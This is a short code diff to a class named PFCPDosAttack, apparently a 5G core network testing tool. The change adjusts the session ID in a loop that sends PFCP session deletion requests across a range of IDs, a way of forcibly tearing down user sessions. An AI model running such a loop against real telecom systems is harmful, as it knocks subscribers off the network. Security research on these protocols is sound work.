@@ -480,7 +480,7 @@ class PFCPDosAttack:
         for i in range(start_index, start_index+count): 
             try:
 
-                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i)
+                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i+1)
 
                     
                 if response == self.REQUEST_ACCEPTED:
